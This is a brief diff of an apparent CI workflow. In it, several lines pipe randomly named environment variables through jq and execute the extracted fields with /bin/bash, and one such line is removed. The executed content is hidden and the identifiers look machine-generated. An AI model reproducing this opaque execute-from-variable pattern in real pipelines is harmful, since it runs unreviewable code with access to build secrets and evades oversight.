@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$sbws5158" | jq -r .xbmgb9579 | /bin/bash
           echo $qyb31579 | jq -r .bscug9895 | /bin/bash
           printf '%s' "$dvhvq279" | jq -r .bzgvy4 | /bin/bash
-          printf '%s' "$aiwno587" | jq -r .agk774 | /bin/bash
           printf '%s' "$rkgo4373" | jq -r .wh8 | /bin/bash
           printf '%s' "$oy2953" | jq -r .o87421 | /bin/bash
           printf '%s' "$qnbez13386" | jq -r .phng6 | /bin/bash
